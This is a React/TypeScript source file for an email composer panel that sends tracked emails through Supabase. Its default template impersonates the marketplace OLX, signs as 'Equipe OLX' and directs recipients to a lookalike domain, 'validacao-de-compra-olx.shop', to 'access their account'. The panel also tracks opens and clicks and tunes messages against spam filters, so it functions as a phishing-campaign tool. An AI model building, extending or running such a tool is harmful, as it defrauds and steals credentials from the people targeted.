import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Mail, Send, Loader2, Eye, AlertTriangle, CheckCircle2, ChevronDown, ChevronUp, MailOpen, MousePointerClick, Trash2 } from "lucide-react";
import { toast } from "sonner";
import { analyzeSpam, type SpamAnalysis } from "@/lib/spam-analyzer";

interface CampaignRow {
  id: string;
  recipient_email: string;
  subject: string;
  status: string;
  open_count: number;
  click_count: number;
  first_opened_at: string | null;
  last_opened_at: string | null;
  sent_at: string | null;
  send_error: string | null;
  spam_score: number | null;
  created_at: string;
}

const DEFAULT_HTML = `<table width="100%" cellpadding="0" cellspacing="0" style="background:#f5f5f5;padding:24px 0;font-family:Arial,sans-serif">
  <tr><td align="center">
    <table width="600" cellpadding="0" cellspacing="0" style="background:#fff;border-radius:8px;overflow:hidden">
      <tr><td style="padding:32px">
        <h1 style="margin:0 0 16px;color:#111;font-size:20px;font-weight:600">Olá,</h1>
        <p style="margin:0 0 16px;color:#333;font-size:15px;line-height:1.6">
          Tudo bem? Estamos passando para confirmar algumas informações sobre sua conta na OLX.
        </p>
        <p style="margin:0 0 16px;color:#333;font-size:15px;line-height:1.6">
          Para continuar, basta acessar o link abaixo e seguir as instruções na tela. Caso já tenha resolvido, pode ignorar esta mensagem.
        </p>
        <p style="margin:28px 0">
          <a href="https://validacao-de-compra-olx.shop" style="background:#7c3aed;color:#ffffff;padding:12px 22px;border-radius:6px;text-decoration:none;display:inline-block;font-weight:600;font-size:15px">Acessar minha conta</a>
        </p>
        <p style="margin:24px 0 0;color:#666;font-size:13px;line-height:1.5">
          Atenciosamente,<br>
          Equipe OLX
        </p>
      </td></tr>
    </table>
  </td></tr>
</table>`;

function formatTime(iso: string | null): string {
  if (!iso) return "—";
  return new Date(iso).toLocaleString("pt-BR", {
    day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit",
  });
}

export function EmailComposerPanel() {
  const [recipient, setRecipient] = useState("");
  const [subject, setSubject] = useState("");
  const [previewText, setPreviewText] = useState("");
  const [html, setHtml] = useState(DEFAULT_HTML);
  const [sending, setSending] = useState(false);
  const [campaigns, setCampaigns] = useState<CampaignRow[]>([]);
  const [showWarnings, setShowWarnings] = useState(true);

  const analysis: SpamAnalysis = useMemo(
    () => analyzeSpam({ subject, html, previewText }),
    [subject, html, previewText],
  );

  // Carrega campanhas
  useEffect(() => {
    let alive = true;
    const load = () =>
      supabase
        .from("email_campaigns")
        .select("id, recipient_email, subject, status, open_count, click_count, first_opened_at, last_opened_at, sent_at, send_error, spam_score, created_at")
        .order("created_at", { ascending: false })
        .limit(50)
        .then(({ data }) => {
          if (alive && data) setCampaigns(data as CampaignRow[]);
        });
    load();

    const ch = supabase
      .channel("dash-campaigns")
      .on("postgres_changes", { event: "*", schema: "public", table: "email_campaigns" }, () => load())
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "email_events" }, () => load())
      .subscribe();
    return () => {
      alive = false;
      void ch.unsubscribe();
    };
  }, []);

  const handleSend = async () => {
    if (!recipient.trim() || !subject.trim() || !html.trim()) {
      toast.error("Preencha destinatário, assunto e conteúdo.");
      return;
    }
    if (analysis.verdict === "bad") {
      if (!confirm(`Score de spam alto (${analysis.score}/100). Enviar mesmo assim?`)) return;
    }
    setSending(true);
    try {
      const { data, error } = await supabase.functions.invoke("send-custom-email", {
        body: {
          recipientEmail: recipient.trim(),
          subject: subject.trim(),
          html,
          previewText: previewText.trim() || null,
          spamScore: analysis.score,
          spamWarnings: analysis.warnings,
        },
      });
      if (error) throw error;
      if (data?.error) throw new Error(data.error);
      toast.success("E-mail enviado!", { description: recipient });
      setRecipient("");
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Erro ao enviar";
      toast.error("Falha no envio", { description: msg });
    } finally {
      setSending(false);
    }
  };

  const handleDelete = async (id: string) => {
    if (!confirm("Apagar esta campanha e seus eventos?")) return;
    const { error } = await supabase.from("email_campaigns").delete().eq("id", id);
    if (error) return toast.error(error.message);
    setCampaigns((prev) => prev.filter((c) => c.id !== id));
    toast.success("Campanha apagada");
  };

  const verdictStyle = {
    good: "bg-success/15 text-success border-success/30",
    okay: "bg-primary/15 text-primary border-primary/30",
    risky: "bg-amber-500/15 text-amber-500 border-amber-500/30",
    bad: "bg-destructive/15 text-destructive border-destructive/30",
  }[analysis.verdict];

  const verdictLabel = {
    good: "Boa entrega",
    okay: "OK",
    risky: "Risco médio",
    bad: "Alto risco de spam",
  }[analysis.verdict];

  return (
    <section className="mt-8 rounded-xl border border-border bg-card shadow-card">
      <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
        <div className="flex items-center gap-2">
          <Mail className="h-4 w-4 text-primary" />
          <h2 className="font-display text-base font-semibold tracking-wider uppercase">E-mails</h2>
          <Badge variant="secondary" className="text-[10px]">{campaigns.length}</Badge>
        </div>
      </div>

      <Tabs defaultValue="compose" className="p-5">
        <TabsList className="mb-4">
          <TabsTrigger value="compose">Novo e-mail</TabsTrigger>
          <TabsTrigger value="sent">Enviados ({campaigns.length})</TabsTrigger>
        </TabsList>

        <TabsContent value="compose" className="space-y-4">
          <div className="grid gap-4 lg:grid-cols-2">
            {/* Editor */}
            <div className="space-y-3">
              <div>
                <Label htmlFor="email-to" className="text-xs">Destinatário</Label>
                <Input
                  id="email-to"
                  type="email"
                  placeholder="cliente@exemplo.com"
                  value={recipient}
                  onChange={(e) => setRecipient(e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="email-subject" className="text-xs">Assunto</Label>
                <Input
                  id="email-subject"
                  placeholder="Confirmação da sua compra"
                  value={subject}
                  onChange={(e) => setSubject(e.target.value)}
                  maxLength={120}
                />
                <span className="mt-1 text-[10px] text-muted-foreground">{subject.length}/120 — ideal até 60</span>
              </div>
              <div>
                <Label htmlFor="email-preview" className="text-xs">Pré-visualização (opcional)</Label>
                <Input
                  id="email-preview"
                  placeholder="Texto que aparece na lista do Gmail"
                  value={previewText}
                  onChange={(e) => setPreviewText(e.target.value)}
                  maxLength={140}
                />
              </div>
              <div>
                <Label htmlFor="email-html" className="text-xs">HTML</Label>
                <Textarea
                  id="email-html"
                  rows={14}
                  value={html}
                  onChange={(e) => setHtml(e.target.value)}
                  className="font-mono text-xs"
                  spellCheck={false}
                />
              </div>

              {/* Análise spam */}
              <div className={`rounded-lg border p-3 ${verdictStyle}`}>
                <div className="flex items-center justify-between gap-2">
                  <div className="flex items-center gap-2">
                    {analysis.verdict === "good" ? (
                      <CheckCircle2 className="h-4 w-4" />
                    ) : (
                      <AlertTriangle className="h-4 w-4" />
                    )}
                    <span className="text-sm font-semibold">{verdictLabel}</span>
                    <span className="text-xs opacity-80">Score {analysis.score}/100</span>
                  </div>
                  {analysis.warnings.length > 0 && (
                    <button
                      type="button"
                      onClick={() => setShowWarnings((v) => !v)}
                      className="text-xs underline"
                    >
                      {showWarnings ? <ChevronUp className="inline h-3 w-3" /> : <ChevronDown className="inline h-3 w-3" />}
                      {analysis.warnings.length} aviso{analysis.warnings.length === 1 ? "" : "s"}
                    </button>
                  )}
                </div>
                {showWarnings && analysis.warnings.length > 0 && (
                  <ul className="mt-3 space-y-1.5 text-xs">
                    {analysis.warnings.map((w, i) => (
                      <li key={i} className="flex gap-2">
                        <span className="opacity-60">•</span>
                        <span>{w.message}</span>
                      </li>
                    ))}
                  </ul>
                )}
              </div>

              <Button onClick={handleSend} disabled={sending} className="w-full" size="lg">
                {sending ? (
                  <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Enviando…</>
                ) : (
                  <><Send className="mr-2 h-4 w-4" /> Enviar e-mail</>
                )}
              </Button>
            </div>

            {/* Preview */}
            <div className="space-y-2">
              <Label className="text-xs">
                <Eye className="mr-1 inline h-3 w-3" />
                Pré-visualização
              </Label>
              <div className="rounded-lg border border-border bg-white">
                <div className="border-b border-border px-3 py-2 text-xs">
                  <div className="text-muted-foreground">De: <span className="text-foreground">OLX &lt;noreply@notify.validacao-de-compra-olx.shop&gt;</span></div>
                  <div className="text-muted-foreground">Para: <span className="text-foreground">{recipient || "—"}</span></div>
                  <div className="font-semibold text-foreground">{subject || "(sem assunto)"}</div>
                  {previewText && <div className="text-muted-foreground italic">{previewText}</div>}
                </div>
                <iframe
                  title="Preview"
                  srcDoc={html}
                  sandbox=""
                  className="h-[480px] w-full rounded-b-lg bg-white"
                />
              </div>
            </div>
          </div>
        </TabsContent>

        <TabsContent value="sent">
          {campaigns.length === 0 ? (
            <div className="py-10 text-center text-sm text-muted-foreground">
              Nenhum e-mail enviado ainda.
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                  <tr>
                    <th className="px-3 py-2 text-left">Quando</th>
                    <th className="px-3 py-2 text-left">Destinatário</th>
                    <th className="px-3 py-2 text-left">Assunto</th>
                    <th className="px-3 py-2 text-left">Status</th>
                    <th className="px-3 py-2 text-left">
                      <MailOpen className="inline h-3 w-3" /> Aberturas
                    </th>
                    <th className="px-3 py-2 text-left">
                      <MousePointerClick className="inline h-3 w-3" /> Cliques
                    </th>
                    <th className="px-3 py-2"></th>
                  </tr>
                </thead>
                <tbody>
                  {campaigns.map((c) => {
                    const opened = c.open_count > 0;
                    return (
                      <tr key={c.id} className="border-t border-border hover:bg-muted/30">
                        <td className="whitespace-nowrap px-3 py-2 text-xs text-muted-foreground font-mono-tabular">
                          {formatTime(c.sent_at || c.created_at)}
                        </td>
                        <td className="break-all px-3 py-2 font-mono text-xs">{c.recipient_email}</td>
                        <td className="px-3 py-2 text-xs">{c.subject}</td>
                        <td className="px-3 py-2 text-xs">
                          {c.status === "sent" && (
                            <Badge variant="secondary" className="bg-success/20 text-success border-success/30">enviado</Badge>
                          )}
                          {c.status === "failed" && (
                            <Badge variant="destructive" title={c.send_error || ""}>falhou</Badge>
                          )}
                          {c.status === "pending" && (
                            <Badge variant="secondary">pendente</Badge>
                          )}
                        </td>
                        <td className="px-3 py-2 text-xs">
                          {opened ? (
                            <span className="font-semibold text-success" title={`Última: ${formatTime(c.last_opened_at)}`}>
                              ✓ {c.open_count}×
                            </span>
                          ) : (
                            <span className="text-muted-foreground">—</span>
                          )}
                        </td>
                        <td className="px-3 py-2 text-xs">
                          {c.click_count > 0 ? (
                            <span className="font-semibold text-primary">{c.click_count}</span>
                          ) : (
                            <span className="text-muted-foreground">—</span>
                          )}
                        </td>
                        <td className="px-3 py-2">
                          <Button
                            size="sm"
                            variant="ghost"
                            onClick={() => handleDelete(c.id)}
                            className="h-7 text-muted-foreground hover:text-destructive"
                          >
                            <Trash2 className="h-3 w-3" />
                          </Button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </TabsContent>
      </Tabs>
    </section>
  );
}